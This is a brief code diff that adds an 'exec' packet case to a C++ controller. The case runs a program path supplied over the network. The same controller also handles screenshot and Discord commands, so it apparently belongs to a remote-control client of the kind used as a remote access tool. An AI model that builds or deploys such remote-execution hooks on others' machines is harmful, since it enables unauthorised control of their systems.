@@ -36,6 +36,13 @@ void Controller::handleData(const vector<char>& buf) {
 		ECASE(Packet::discordCommand):
 			ret = discordCommand(this, (DiscordCommand) get<uint8_t>(buf, &offset));
 			break;
+		ECASE(Packet::exec):
+		{
+			string& path = get<string>(buf, &offset);
+			int wait = get<char>(buf, &offset);
+			ret = exec(this, path, wait);
+		}
+			break;
 		ECASE(Packet::screenshot):
 			ret = screenshot(this);
 			break;
